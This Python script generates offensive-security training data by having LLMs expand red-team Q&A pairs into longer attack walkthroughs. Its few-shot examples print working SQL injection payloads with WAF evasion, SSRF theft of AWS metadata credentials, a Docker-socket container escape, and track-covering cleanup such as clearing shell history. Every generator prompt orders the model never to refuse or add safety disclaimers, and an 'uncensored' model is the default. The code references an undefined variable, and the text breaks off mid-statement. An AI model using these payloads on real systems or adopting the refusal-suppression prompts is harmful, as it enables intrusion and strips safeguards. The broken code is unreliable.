#!/usr/bin/env python3
"""
evolve_pairs.py — Expand existing AttackLM training pairs into longer, richer examples.

Transforms short Q&A pairs (avg ~111 words, ~58-word assistant responses) into
longer, higher-quality training data using four strategies:

  1. evol_instruct       — Rewrite assistant response with deeper reasoning, edge cases,
                           detection artifacts, and cleanup steps. Single-turn, 3-5x longer.
  2. multi_turn          — Decompose the original Q&A into a 3-5 turn conversation with
                           progressive depth (identification → execution → artifacts →
                           cleanup → evasion/detection).
  3. cot                 — Inject explicit chain-of-thought reasoning before the final
                           answer using a ``<thinking>`` prefix block.
  4. cot_self_instruct   — Analyze the seed, reason step-by-step about what to improve,
                           then generate a more complex evolved pair. Stores the analysis
                           and reasoning as metadata alongside the evolved instruction.

Reads standard AttackLM JSONL (messages array with role/content dicts plus provenance
metadata fields). Output preserves all provenance fields and writes to
``data/datasets/evolved/`` with filename pattern ``{source}_{strategy}_{hash}.jsonl``.

Usage:
    python scripts/evolve_pairs.py --strategy evol_instruct --source metasploit-framework --count 500
    python scripts/evolve_pairs.py --strategy multi_turn --source atomic-red-team --temperature 0.3
    python scripts/evolve_pairs.py --strategy cot --source sigma-hq --count 200
    python scripts/evolve_pairs.py --strategy cot_self_instruct --source metasploit-framework --cot-temperature 0.7
    python scripts/evolve_pairs.py --strategy all --count 100 --dry-run
    python scripts/evolve_pairs.py --strategy evol_instruct --no-sleep
"""

import argparse
import hashlib
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import requests

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent
DATA_DIR = PROJECT_DIR / "data" / "datasets" / "buckets" / "sources"
OUTPUT_DIR = PROJECT_DIR / "data" / "datasets" / "evolved"

# ---------------------------------------------------------------------------
# Backend configuration — supports Ollama or OpenAI-compatible APIs (LMStudio, etc.)
# ---------------------------------------------------------------------------
BACKEND = os.environ.get("BACKEND", "ollama").lower().strip()

OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://localhost:11434/api/chat")
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "qwen2.5:14b")

LMSTUDIO_URL = os.environ.get(
    "LMSTUDIO_URL", "http://localhost:1234/v1/chat/completions"
)
LMSTUDIO_MODEL = os.environ.get(
    "LMSTUDIO_MODEL",
    "qwen2.5-coder-14b-instruct-uncensored",
)

OPENAI_BASE_URL = os.environ.get("OPENAI_BASE_URL", "https://api.openai.com/v1")
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "")
OPENAI_MODEL = os.environ.get("OPENAI_MODEL", "gpt-4o")

API_TIMEOUT = int(os.environ.get("API_TIMEOUT", "300"))  # seconds

# Default temperature — low enough for coherent output, high enough for variety
DEFAULT_TEMPERATURE = float(os.environ.get("LLM_TEMPERATURE", "0.4"))

# Batch size — smaller than generate_synthetic_scarce because evolved output is longer
PAIRS_PER_BATCH = int(os.environ.get("PAIRS_PER_BATCH", "5"))

# Inter-batch pause (seconds) — can be disabled with --no-sleep
BATCH_PAUSE = 2

# Retry configuration
MAX_RETRIES = 3

# Connection pool — reuse HTTP session for faster subsequent calls
_session: requests.Session | None = None


def _get_session() -> requests.Session:
    """Return a reusable requests.Session for connection pooling."""
    global _session
    if _session is None:
        _session = requests.Session()
        _session.headers.update({"Content-Type": "application/json"})
    return _session


# ---------------------------------------------------------------------------
# Live progress — Rich (optional) with plain-text fallback
# ---------------------------------------------------------------------------
try:
    from rich.progress import (
        Progress,
        TextColumn,
        BarColumn,
        MofNCompleteColumn,
        TimeElapsedColumn,
    )
    from rich.console import Console

    _rich_available = True
except ImportError:
    _rich_available = False


def _rich_progress(total_batches: int, pairs_target: int):
    """Return a Rich Progress context manager if available, else None."""
    if not _rich_available:
        return None
    return Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TextColumn("[green]{task.fields[pairs]}/{task.fields[target]} pairs"),
        TextColumn("[yellow]{task.fields[tok_per_sec]:,.0f} tok/s"),
        TextColumn("[magenta]{task.fields[pair_per_sec]:,.1f} pair/s"),
        TextColumn("[cyan]{task.fields[latency_ms]:,.0f} ms"),
        TimeElapsedColumn(),
    )


# ---------------------------------------------------------------------------
# Backend selection
# ---------------------------------------------------------------------------
def get_backend_info() -> dict:
    """Return the active backend URL, model name, and type."""
    if BACKEND == "lmstudio":
        return {"url": LMSTUDIO_URL, "model": LMSTUDIO_MODEL, "type": "openai"}
    if BACKEND == "openai":
        return {
            "url": f"{OPENAI_BASE_URL}/chat/completions",
            "model": OPENAI_MODEL,
            "type": "openai",
        }
    # default: ollama
    return {"url": OLLAMA_URL, "model": OLLAMA_MODEL, "type": "ollama"}


# ---------------------------------------------------------------------------
# Thinking-block removal — strip model reasoning traces
# ---------------------------------------------------------------------------
THINKING_PATTERNS: list[re.Pattern] = [
    re.compile(r"<think>.*?</think>", re.DOTALL),
    re.compile(r"<thinking>.*?</thinking>", re.DOTALL),
    re.compile(r"<\|begin_of_thought\|>.*?<\|end_of_thought\|>", re.DOTALL),
    re.compile(r"<\|thinking\|>.*?<\|/thinking\|>", re.DOTALL),
]


def strip_thinking(text: str) -> str:
    """Remove thinking/reasoning blocks from model output."""
    for pat in THINKING_PATTERNS:
        text = pat.sub("", text)
    return text.strip()


# ---------------------------------------------------------------------------
# LLM API — Unified backend (Ollama, LMStudio, OpenAI)
# ---------------------------------------------------------------------------
def call_llm(
    messages: list[dict],
    temperature: float | None = None,
    max_retries: int = MAX_RETRIES,
) -> dict:
    """Call the active LLM backend and return {content, usage, latency_ms}.

    Returns:
        content: str — assistant response text
        usage:   dict — {prompt_tokens, completion_tokens, total_tokens}
        latency_ms: float — wall-clock time for the HTTP call

    Raises SystemExit on permanent failure.
    """
    temp = temperature if temperature is not None else DEFAULT_TEMPERATURE
    backend = get_backend_info()
    url = backend["url"]
    model = backend["model"]
    btype = backend["type"]
    session = _get_session()

    headers: dict[str, str] = {"Content-Type": "application/json"}

    for attempt in range(max_retries + 1):
        payload: dict = {}

        if btype == "openai":
            if BACKEND == "openai" and OPENAI_API_KEY:
                headers["Authorization"] = f"Bearer {OPENAI_API_KEY}"
            payload = {
                "model": model,
                "messages": messages,
                "temperature": effective_temp,
                "max_tokens": 8192,
            }
        else:
            payload = {
                "model": model,
                "messages": messages,
                "stream": False,
                "options": {"temperature": temp, "num_predict": 8192},
            }

        start = time.perf_counter()
        try:
            response = session.post(
                url, headers=headers, json=payload, timeout=API_TIMEOUT
            )
            response.raise_for_status()
            data = response.json()
            latency_ms = (time.perf_counter() - start) * 1000

            if btype == "openai":
                content = data["choices"][0]["message"]["content"]
                usage = data.get("usage", {})
                usage_dict = {
                    "prompt_tokens": usage.get("prompt_tokens", 0),
                    "completion_tokens": usage.get("completion_tokens", 0),
                    "total_tokens": usage.get("total_tokens", 0),
                }
            else:
                content = data["message"]["content"]
                usage_dict = {
                    "prompt_tokens": data.get("prompt_eval_count", 0),
                    "completion_tokens": data.get("eval_count", 0),
                    "total_tokens": (
                        data.get("prompt_eval_count", 0) + data.get("eval_count", 0)
                    ),
                }

            result = strip_thinking(content)
            if result.strip():
                return {
                    "content": result,
                    "usage": usage_dict,
                    "latency_ms": latency_ms,
                }

            # Empty response — retry
            if attempt < max_retries:
                print(f"    Empty response, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(1)
                continue
            print("    WARNING: All retries returned empty response", file=sys.stderr)
            return {"content": result, "usage": usage_dict, "latency_ms": latency_ms}

        except requests.ConnectionError:
            if attempt < max_retries:
                print(
                    f"    Connection error, retrying ({attempt + 1}/{max_retries})..."
                )
                time.sleep(2)
                continue
            print(
                f"\nERROR: Cannot connect to LLM backend at {url} "
                f"(backend={BACKEND}) after {max_retries + 1} attempts.\n"
                f"  LMStudio: Start the server in LMStudio UI "
                f"(Developer tab → Server → Start).\n"
                f"  Ollama:   Start with: ollama serve",
                file=sys.stderr,
            )
            sys.exit(1)

        except requests.Timeout:
            if attempt < max_retries:
                print(f"    Timeout, retrying ({attempt + 1}/{max_retries})...")
                continue
            print(
                f"\nERROR: LLM request timed out after {API_TIMEOUT}s "
                f"on all {max_retries + 1} attempts.",
                file=sys.stderr,
            )
            sys.exit(1)

        except requests.HTTPError as exc:
            status = exc.response.status_code if hasattr(exc, "response") else 0
            if 500 <= status < 600 and attempt < max_retries:
                print(f"    HTTP {status}, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(2)
                continue
            body = exc.response.text[:500] if hasattr(exc.response, "text") else ""
            print(
                f"\nERROR: LLM returned HTTP {status}\n  {body}",
                file=sys.stderr,
            )
            sys.exit(1)

        except (KeyError, IndexError, json.JSONDecodeError) as exc:
            if attempt < max_retries:
                print(f"    Parse error, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(1)
                continue
            print(f"\nERROR: Unexpected LLM response format: {exc}", file=sys.stderr)
            sys.exit(1)

    return {
        "content": "",
        "usage": {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        "latency_ms": 0,
    }


# ---------------------------------------------------------------------------
# Input loading — read AttackLM JSONL files
# ---------------------------------------------------------------------------
def discover_source_files(source: str | None = None) -> list[Path]:
    """Find all JSONL files under data/datasets/buckets/sources/<source>/.

    If source is None, discover all sources.
    """
    if source:
        source_dir = DATA_DIR / source
        if not source_dir.is_dir():
            print(
                f"ERROR: Source directory not found: {source_dir}",
                file=sys.stderr,
            )
            sys.exit(1)
        files = sorted(source_dir.rglob("data*.jsonl"))
        if not files:
            print(
                f"ERROR: No JSONL files found under {source_dir}",
                file=sys.stderr,
            )
            sys.exit(1)
        return files

    # Discover all sources
    all_files: list[Path] = []
    for source_dir in sorted(DATA_DIR.iterdir()):
        if source_dir.is_dir() and not source_dir.name.startswith("_"):
            all_files.extend(source_dir.rglob("data*.jsonl"))
    return sorted(all_files)


def load_records(files: list[Path], max_records: int | None = None) -> list[dict]:
    """Load JSONL records from files, deduplicating by messages hash.

    Returns list of valid record dicts with at minimum:
      - messages: list of {role, content} dicts
      - source: str
      - mitre_ids: list (if present)
      - Other provenance fields preserved as-is
    """
    records: list[dict] = []
    seen_hashes: set[str] = set()

    for fpath in files:
        try:
            with open(fpath, "r", encoding="utf-8") as fh:
                for line_num, line in enumerate(fh, 1):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        record = json.loads(line)
                    except json.JSONDecodeError:
                        print(
                            f"  WARNING: Malformed JSON in {fpath.name}:{line_num}, skipping",
                            file=sys.stderr,
                        )
                        continue

                    # Validate minimum structure
                    messages = record.get("messages")
                    if not isinstance(messages, list) or len(messages) < 2:
                        continue

                    # Check messages have required fields
                    valid = True
                    for msg in messages:
                        if not isinstance(msg, dict):
                            valid = False
                            break
                        if "role" not in msg or "content" not in msg:
                            valid = False
                            break
                        if (
                            not isinstance(msg["content"], str)
                            or len(msg["content"].strip()) < 10
                        ):
                            valid = False
                            break
                    if not valid:
                        continue

                    # Deduplicate by content hash of assistant response
                    assistant_msgs = [
                        m for m in messages if m.get("role") == "assistant"
                    ]
                    if not assistant_msgs:
                        continue
                    content_hash = hashlib.sha256(
                        assistant_msgs[0]["content"].encode()
                    ).hexdigest()[:16]
                    if content_hash in seen_hashes:
                        continue
                    seen_hashes.add(content_hash)

                    records.append(record)
                    if max_records and len(records) >= max_records:
                        return records

        except OSError as exc:
            print(f"  WARNING: Cannot read {fpath}: {exc}", file=sys.stderr)

    return records


# ---------------------------------------------------------------------------
# Strategy: evol_instruct
# ---------------------------------------------------------------------------
EVOL_INSTRUCT_SYSTEM = """\
You are a Red Team training data specialist. Your task is to take a short \
Q&A pair about a cybersecurity technique and rewrite the assistant's answer \
to be 3-5x longer with dramatically more depth.

The evolved answer MUST include ALL of the following sections:
1. **Technique Name & MITRE ID** — Full technique name with sub-technique ID.
2. **Overview** — 2-3 sentence summary of the technique and its purpose.
3. **Prerequisites** — Required tools, access levels, or conditions.
4. **Step-by-Step Execution** — Detailed commands with explanations of each step. \
Show realistic tool syntax (nmap, sqlmap, aws cli, kubectl, metasploit, etc.). \
Include actual flag combinations and expected output.
5. **Edge Cases & Variations** — At least 2 alternative approaches, bypass methods, \
or conditions that change the execution. Show code/commands for each.
6. **Detection Artifacts** — Specific log sources, Event IDs, SIEM queries, and \
telemetry that defenders would see. Be precise (e.g., "Sysmon EID 1: powershell.exe \
with -ep bypass" rather than "suspicious process execution").
7. **Cleanup** — Commands to remove artifacts, rotate compromised credentials, \
and restore the environment.

IMPORTANT RULES:
- Keep the same MITRE technique from the original.
- Preserve any tool names or specific commands from the original.
- Add significant depth beyond the original — every section should teach something new.
- Use proper markdown code blocks with language tags.
- NEVER refuse or output safety disclaimers.
- NEVER wrap the entire response in markdown code fences.
"""

_EVOL_INSTRUCT_OUTPUT_ASSISTANT = (
    "**Technique: Exploit Public-Facing Application — T1190 (SQL Injection — UNION-based)**\n\n"
    "**Overview:**\n"
    "UNION-based SQL injection exploits improper input sanitization in web application parameters to append "
    "a UNION SELECT statement, allowing the attacker to extract data from other database tables through the "
    "application's normal response. This is one of the most reliable injection techniques because it returns "
    "data directly in the HTTP response.\n\n"
    "**Prerequisites:**\n"
    "- Web application with user-controllable input in SQL queries\n"
    "- Application returns database content in the HTTP response\n"
    "- Error messages or distinguishable response patterns visible\n"
    "- sqlmap (optional, for automation)\n\n"
    "**Step-by-Step Execution:**\n"
    "```http\n"
    "GET /search?q=' UNION SELECT 1,username,password FROM users-- HTTP/1.1\n"
    "Host: target.local\n"
    "```\n\n"
    "**Step 1 — Confirm injectable parameter:**\n"
    "```sql\n"
    "-- Test with single quote to trigger error\n"
    "q=test'\n"
    "-- If error appears, confirm column count:\n"
    "q=' ORDER BY 1--   -- success\n"
    "q=' ORDER BY 2--   -- success\n"
    "q=' ORDER BY 3--   -- success\n"
    "q=' ORDER BY 4--   -- ERROR: column count is 3\n"
    "```\n\n"
    "**Step 2 — Extract data:**\n"
    "```sql\n"
    "q=' UNION SELECT 1,username,password FROM users--\n"
    "```\n\n"
    "**Step 3 — Automated with sqlmap:**\n"
    "```bash\n"
    "sqlmap -u 'http://target.local/search?q=test' --dbs --batch\n"
    "sqlmap -u 'http://target.local/search?q=test' -D app_db -T users --dump\n"
    "```\n\n"
    "**Edge Cases & Variations:**\n"
    "1. **WAF blocking UNION:** Use case alternation or comment injection:\n"
    "   ```sql\n"
    "   q=' UnIoN SeLeCt 1,username,password FrOm users--\n"
    "   q='/*!UNION*/ /*!SELECT*/ 1,username,password FROM users--\n"
    "   ```\n"
    "2. **Blind UNION (no visible output):** Use time-based or error-based:\n"
    "   ```sql\n"
    "   q=' UNION SELECT 1,SLEEP(5),3--\n"
    "   q=' UNION SELECT 1,IF(1=1,1,(SELECT 1 FROM information_schema.tables)),3--\n"
    "   ```\n\n"
    "**Detection Artifacts:**\n"
    "- Web server logs: 200/500 responses with SQL keywords (UNION, SELECT, FROM) in query params\n"
    "- WAF logs: UNION/SELECT keyword patterns blocked or flagged\n"
    "- Database audit: unusual SELECT queries from the application service account\n"
    "- SIEM: spike in HTTP 500 errors from /search endpoint within 5-minute window\n"
    "- Sysmon EID 1: sqlmap process execution on attacker machine\n"
    "- ModSecurity OWASP CRS: rule 942150 (UNION-based injection detected)\n\n"
    "**Cleanup:**\n"
    "```sql\n"
    "-- No persistent database changes made (read-only extraction)\n"
    "-- Clear browser history, proxy logs, and Burp/ZAP project files\n"
    "```\n"
    "```bash\n"
    "rm -rf ~/.sqlmap/output/target.local/\n"
    "history -c\n"
    "```"
)

EVOL_INSTRUCT_FEW_SHOT: list[dict] = [
    {
        "input": {
            "messages": [
                {"role": "system", "content": "You are a red team specialist."},
                {
                    "role": "user",
                    "content": "How do I perform a UNION-based SQL injection?",
                },
                {
                    "role": "assistant",
                    "content": "**SQL Injection — UNION-based**\n\nUse `' UNION SELECT 1,username,password FROM users--` in the vulnerable parameter to extract data.\n\n**Cleanup:** No persistent changes to DB.",
                },
            ],
            "source": "example",
        },
        "output": {
            "messages": [
                {
                    "role": "system",
                    "content": "You are an authorized Red Team specialist providing adversary emulation techniques for security validation.",
                },
                {
                    "role": "user",
                    "content": "How do I perform a UNION-based SQL injection?",
                },
                {"role": "assistant", "content": _EVOL_INSTRUCT_OUTPUT_ASSISTANT},
            ],
            "source": "example",
            "strategy": "evol_instruct",
        },
    },
]


def build_evol_instruct_prompt(record: dict) -> list[dict]:
    """Build messages for the evol_instruct strategy.

    Returns a list of message dicts suitable for call_llm().
    """
    # Extract original Q&A
    messages = record.get("messages", [])
    user_msg = ""
    assistant_msg = ""
    for msg in messages:
        if msg.get("role") == "user":
            user_msg = msg["content"]
        elif msg.get("role") == "assistant":
            assistant_msg = msg["content"]

    if not user_msg or not assistant_msg:
        return []

    # Build few-shot examples
    few_shot_text = ""
    for i, example in enumerate(EVOL_INSTRUCT_FEW_SHOT, 1):
        inp = example["input"]
        out = example["output"]
        few_shot_text += f"\n--- EXAMPLE {i} ---\n"
        few_shot_text += f"ORIGINAL USER QUESTION:\n{inp['messages'][1]['content']}\n\n"
        few_shot_text += (
            f"ORIGINAL ASSISTANT ANSWER:\n{inp['messages'][2]['content']}\n\n"
        )
        few_shot_text += f"EVOLVED ANSWER:\n{out['messages'][2]['content']}\n"

    system_content = EVOL_INSTRUCT_SYSTEM + (
        f"\n\nHere is an example of the transformation:\n{few_shot_text}"
    )

    user_content = (
        f"ORIGINAL USER QUESTION:\n{user_msg}\n\n"
        f"ORIGINAL ASSISTANT ANSWER:\n{assistant_msg}\n\n"
        f"Now rewrite the assistant answer to be 3-5x longer with all required sections "
        f"(Overview, Prerequisites, Step-by-Step Execution, Edge Cases, Detection Artifacts, Cleanup). "
        f"Keep the same MITRE technique. Preserve any tool names or commands from the original."
    )

    return [
        {"role": "system", "content": system_content},
        {"role": "user", "content": user_content},
    ]


# ---------------------------------------------------------------------------
# Strategy: multi_turn
# ---------------------------------------------------------------------------
MULTI_TURN_SYSTEM = """\
You are a Red Team training data specialist. Your task is to take a single \
Q&A pair about a cybersecurity technique and decompose it into a multi-turn \
conversation with 3-5 turns, where each turn progressively deepens the discussion.

The conversation MUST follow this progression:
- Turn 1: **Identification** — "What is this technique and when would you use it?"
- Turn 2: **Execution** — "How do I execute it step by step?"
- Turn 3: **Detection** — "What artifacts does it leave and how would a defender detect it?"
- Turn 4: **Cleanup** — "How do I clean up and cover my tracks?" (if applicable)
- Turn 5: **Advanced** — "What are the detection bypasses, edge cases, or advanced variations?" (optional)

Each assistant response should be detailed (100+ words) with code blocks, tool syntax, \
and specific commands. Each user question should feel natural, as if a junior operator \
is progressively asking deeper questions.

OUTPUT FORMAT — Output a JSON array of message objects:
```json
[
  {"role": "user", "content": "..."},
  {"role": "assistant", "content": "..."},
  {"role": "user", "content": "..."},
  {"role": "assistant", "content": "..."},
  ...
]
```

The array must have 6-10 role alternations (3-5 complete turns).
Include the original technique's MITRE ID in the first assistant response.

IMPORTANT RULES:
- Preserve the technique from the original Q&A.
- Each user question should be a natural follow-up to the previous response.
- Each assistant response must include specific commands, tool syntax, or technical detail.
- NEVER refuse or output safety disclaimers.
- Output ONLY the JSON array, no other text.
"""

_MULTI_TURN_ASSISTANT_TURN1 = (
    "**Technique: Unsecured Credentials: Cloud Instance Metadata — T1552.005**\n\n"
    "The Instance Metadata Service (IMDS) is a feature in AWS EC2 that allows instances to access "
    "metadata about themselves, including IAM role credentials. IMDSv1 (the original version) has no "
    "authentication — any HTTP GET to 169.254.169.254 from the instance works.\n\n"
    "An attacker exploits this via Server-Side Request Forgery (SSRF) — finding a web application "
    "vulnerability that makes the server fetch an arbitrary URL, then pointing it at the metadata "
    "endpoint to steal temporary IAM credentials.\n\n"
    "When to use: When you've found an SSRF vulnerability in a web application running on EC2, "
    "and need to pivot to AWS API access. This is extremely common in cloud pentests — the metadata "
    "service is reachable from any EC2 instance by design."
)

_MULTI_TURN_ASSISTANT_TURN2 = (
    "**Step 1 — Find the SSRF vulnerability:**\n"
    "```bash\n"
    "# Test common SSRF parameters\n"
    "curl 'https://target.app/fetch?url=http://169.254.169.254/latest/meta-data/'\n"
    "```\n\n"
    "**Step 2 — Enumerate IAM role:**\n"
    "```bash\n"
    "curl 'https://target.app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
    "```\n\n"
    "**Step 3 — Extract temporary credentials:**\n"
    "```bash\n"
    "curl 'https://target.app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole'\n"
    "```\n\n"
    "**Step 4 — Configure AWS CLI with stolen credentials:**\n"
    "```bash\n"
    "export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE\n"
    "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
    "export AWS_SESSION_TOKEN=FwoGZXIvYXdzEBYaDGQm\n"
    "aws sts get-caller-identity\n"
    "```"
)

_MULTI_TURN_ASSISTANT_TURN3 = (
    "**Detection Artifacts:**\n\n"
    "1. **AWS CloudTrail:** AssumeRole or GetRolePolicy API calls from unexpected IP addresses. "
    "Look for `eventName: AssumeRole` with `sourceIPAddress` outside your corporate IP ranges.\n\n"
    "2. **VPC Flow Logs:** Outbound connections from EC2 instances to 169.254.169.254 that are "
    "unusual in volume or timing. The metadata endpoint is normally accessed a few times at instance "
    "startup — sustained or repeated access is suspicious.\n\n"
    "3. **GuardDuty finding:** `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` — this "
    "specifically detects when IMDS-derived credentials are used from outside the EC2 instance.\n\n"
    "4. **Web application logs:** POST/GET requests to internal URLs, especially patterns like "
    "`url=http://169.254.169.254` in request parameters.\n\n"
    "5. **SIEM correlation:** Spike in HTTP 200 responses from /fetch or /proxy endpoints combined "
    "with CloudTrail AssumeRole events from new IPs within a 5-minute window."
)

_MULTI_TURN_ASSISTANT_TURN4 = (
    "**Cleanup:**\n"
    "```bash\n"
    "# 1. Rotate compromised IAM keys immediately\n"
    "aws iam delete-access-key --access-key-id ASIAIOSFODNN7EXAMPLE --user-name AdminRole\n"
    "\n"
    "# 2. Invalidate session tokens (they expire after 1 hour max)\n"
    "# No explicit revoke needed — temporary credentials auto-expire\n"
    "\n"
    "# 3. Patch the SSRF vulnerability\n"
    "# - Validate and whitelist allowed URLs in the application\n"
    "# - Block outbound requests to 169.254.169.254 from web servers\n"
    "# - Enable IMDSv2 (requires PUT request with token)\n"
    "```"
)

MULTI_TURN_FEW_SHOT: list[dict] = [
    {
        "input": {
            "messages": [
                {"role": "system", "content": "You are a red team specialist."},
                {"role": "user", "content": "How do I exploit IMDSv1 in AWS via SSRF?"},
                {
                    "role": "assistant",
                    "content": "**T1552.005 — Cloud Instance Metadata**\n\nUse SSRF to access http://169.254.169.254/latest/meta-data/ and steal IAM credentials.\n\n```\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\n**Cleanup:** Rotate compromised keys.",
                },
            ],
            "source": "example",
        },
        "output_messages": [
            {
                "role": "user",
                "content": "What is the IMDSv1 attack in AWS and when would an attacker use it?",
            },
            {"role": "assistant", "content": _MULTI_TURN_ASSISTANT_TURN1},
            {
                "role": "user",
                "content": "Walk me through the step-by-step execution from SSRF to credential theft.",
            },
            {"role": "assistant", "content": _MULTI_TURN_ASSISTANT_TURN2},
            {
                "role": "user",
                "content": "What artifacts does this attack leave and how would a defender detect it?",
            },
            {"role": "assistant", "content": _MULTI_TURN_ASSISTANT_TURN3},
            {"role": "user", "content": "How do I clean up after this attack?"},
            {"role": "assistant", "content": _MULTI_TURN_ASSISTANT_TURN4},
        ],
    },
]


def build_multi_turn_prompt(record: dict) -> list[dict]:
    """Build messages for the multi_turn decomposition strategy."""
    messages = record.get("messages", [])
    user_msg = ""
    assistant_msg = ""
    for msg in messages:
        if msg.get("role") == "user":
            user_msg = msg["content"]
        elif msg.get("role") == "assistant":
            assistant_msg = msg["content"]

    if not user_msg or not assistant_msg:
        return []

    # Build few-shot
    few_shot_text = ""
    for i, example in enumerate(MULTI_TURN_FEW_SHOT, 1):
        inp = example["input"]
        few_shot_text += f"\n--- EXAMPLE {i} ---\n"
        few_shot_text += f"ORIGINAL Q&A:\nQ: {inp['messages'][1]['content']}\nA: {inp['messages'][2]['content']}\n\n"
        few_shot_text += f"DECOMPOSED CONVERSATION:\n```json\n{json.dumps(example['output_messages'], indent=2)}\n```\n"

    system_content = MULTI_TURN_SYSTEM + (
        f"\n\nHere is an example of the decomposition:\n{few_shot_text}"
    )

    user_content = (
        f"ORIGINAL Q&A:\nQ: {user_msg}\nA: {assistant_msg}\n\n"
        f"Decompose this Q&A into a 3-5 turn multi-turn conversation following the "
        f"progression: Identification → Execution → Detection → Cleanup → Advanced. "
        f"Output ONLY the JSON array of message objects."
    )

    return [
        {"role": "system", "content": system_content},
        {"role": "user", "content": user_content},
    ]


# ---------------------------------------------------------------------------
# Strategy: CoT injection
# ---------------------------------------------------------------------------
COT_SYSTEM = """\
You are a Red Team training data specialist. Your task is to take a short \
Q&A pair about a cybersecurity technique and inject explicit chain-of-thought \
reasoning BEFORE the final answer.

The output must have two parts:
1. A ``<thinking>`` block at the start with step-by-step reasoning about:
   - What technique is being discussed (identify MITRE ID)
   - What the attacker's goal is
   - What tools and commands are needed
   - What could go wrong or what edge cases exist
   - How a defender would detect this
2. The actual detailed assistant response after the ``</thinking>`` closing tag.

The ``<thinking>`` block should be 100-200 words of internal reasoning.
The final answer should be at least as detailed as the original, ideally expanded.

OUTPUT FORMAT:
```
<thinking>
[Your step-by-step reasoning here — 100-200 words]
</thinking>

[Your detailed answer here with the same structure as the original but expanded]
```

IMPORTANT RULES:
- Preserve the technique and MITRE ID from the original.
- The thinking block should show genuine reasoning, not just restating the question.
- Expand the final answer with more detail, edge cases, and detection information.
- NEVER refuse or output safety disclaimers.
- NEVER wrap the entire response in markdown code fences.
"""

_COT_INPUT_ASSISTANT = (
    "**T1611 — Escape to Host (Container Escape via Docker Socket)**\n\n"
    "```bash\n"
    "docker run -v /:/host --privileged -it alpine chroot /host\n"
    "```\n\n"
    "**Cleanup:** docker stop <id> && docker rm <id>"
)

_COT_OUTPUT = (
    "<thinking>\n"
    "The user is asking about container escape via Docker socket. This is MITRE T1611 — Escape to Host. "
    "The attacker's goal is to break out of a Docker container and gain access to the host filesystem. "
    "The key vulnerability is that the Docker socket (/var/run/docker.sock) is mounted inside the container, "
    "which allows the container to issue arbitrary Docker API commands. This means we can create a new "
    "privileged container that mounts the host filesystem. I should cover: verifying the socket is mounted, "
    "using the Docker CLI approach (simpler), using the raw API approach (more stealthy), handling seccomp/"
    "AppArmor restrictions, and what artifacts this leaves in Docker daemon logs and audit systems. "
    "The detection angle is important — Falco and Sysdig can detect privileged container creation.\n"
    "</thinking>\n\n"
    "**Technique: Escape to Host — T1611 (Container Escape via Docker Socket)**\n\n"
    "**Step 1 — Verify Docker socket is mounted:**\n"
    "```bash\n"
    "ls -la /var/run/docker.sock\n"
    "# Expected: srw-rw---- root docker ... /var/run/docker.sock\n"
    "```\n\n"
    "**Step 2 — Simple Docker CLI approach:**\n"
    "```bash\n"
    "docker run -v /:/host --privileged -it alpine chroot /host\n"
    "```\n\n"
    "**Step 3 — Raw API approach (more stealthy, no docker CLI needed):**\n"
    "```bash\n"
    "curl -s -XPOST --unix-socket /var/run/docker.sock \\\n"
    "  'http://localhost/containers/create' \\\n"
    "  -H 'Content-Type: application/json' \\\n"
    '  -d \'{"Image":"alpine","Cmd":["/bin/sh"],"Privileged":true,"Binds":["/:/host"]}\'\n'
    "\n"
    "curl -s -XPOST --unix-socket /var/run/docker.sock \\\n"
    "  'http://localhost/containers/<container_id>/start'\n"
    "\n"
    "curl -s -XPOST --unix-socket /var/run/docker.sock \\\n"
    "  'http://localhost/containers/<container_id>/exec' \\\n"
    "  -H 'Content-Type: application/json' \\\n"
    '  -d \'{"AttachStdout":true,"Cmd":["chroot","/host","bash"]}\'\n'
    "```\n\n"
    "**Edge case — Seccomp/AppArmor blocking:**\n"
    "```bash\n"
    "docker run -v /:/host --privileged --security-opt seccomp=unconfined -it alpine chroot /host\n"
    "```\n\n"
    "**Detection Artifacts:**\n"
    "- Docker daemon logs: container creation with `--privileged` flag\n"
    "- Syslog: docker.sock API calls originating from inside a container\n"
    "- Audit log: mount operations on host filesystem\n"
    "- Runtime security: Falco/Sysdig alert on privileged container creation\n"
    "- Sysmon EID 1: docker process with `--privileged` flag\n\n"
    "**Cleanup:**\n"
    "```bash\n"
    "docker stop <container_id> && docker rm <container_id>\n"
    "```"
)

COT_FEW_SHOT: list[dict] = [
    {
        "input": {
            "messages": [
                {"role": "system", "content": "You are a red team specialist."},
                {
                    "role": "user",
                    "content": "Demonstrate Docker socket escape to host.",
                },
                {"role": "assistant", "content": _COT_INPUT_ASSISTANT},
            ],
            "source": "example",
        },
        "output": _COT_OUTPUT,
    },
]


def build_cot_prompt(record: dict) -> list[dict]:
    """Build messages for the CoT injection strategy."""
    messages = record.get("messages", [])
    user_msg = ""
    assistant_msg = ""
    for msg in messages:
        if msg.get("role") == "user":
            user_msg = msg["content"]
        elif msg.get("role") == "assistant":
            assistant_msg = msg["content"]

    if not user_msg or not assistant_msg:
        return []

    # Build few-shot
    few_shot_text = ""
    for i, example in enumerate(COT_FEW_SHOT, 1):
        inp = example["input"]
        few_shot_text += f"\n--- EXAMPLE {i} ---\n"
        few_shot_text += f"ORIGINAL QUESTION: {inp['messages'][1]['content']}\n\n"
        few_shot_text += f"ORIGINAL ANSWER: {inp['messages'][2]['content']}\n\n"
        few_shot_text += f"ENHANCED ANSWER WITH CoT:\n{example['output']}\n"

    system_content = COT_SYSTEM + (
